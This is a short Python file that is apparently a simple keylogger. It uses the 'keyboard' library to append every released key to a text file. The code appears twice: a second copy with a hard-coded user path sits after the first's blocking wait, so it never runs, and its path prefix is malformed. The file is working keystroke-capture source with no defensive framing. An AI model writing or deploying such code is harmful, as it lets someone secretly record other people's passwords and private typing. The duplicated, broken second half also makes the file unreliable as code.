import keyboard

def on_key(event):
    key = event.name
    with open('keylog.txt', 'a') as file:
        file.write(key + '\n')

keyboard.on_release(on_key)
keyboard.wait()
import os

# Set the path to the log file
log_file = '/c:/Users/suyas/OneDrive/Documents/Internship/keylog.txt'

# Create the log file if it doesn't exist
if not os.path.exists(log_file):
    open(log_file, 'w').close()

# Function to handle key events
def on_key(event):
    key = event.name
    with open(log_file, 'a') as file:
        file.write(key + '\n')

# Register the key event handler
keyboard.on_release(on_key)
keyboard.wait()
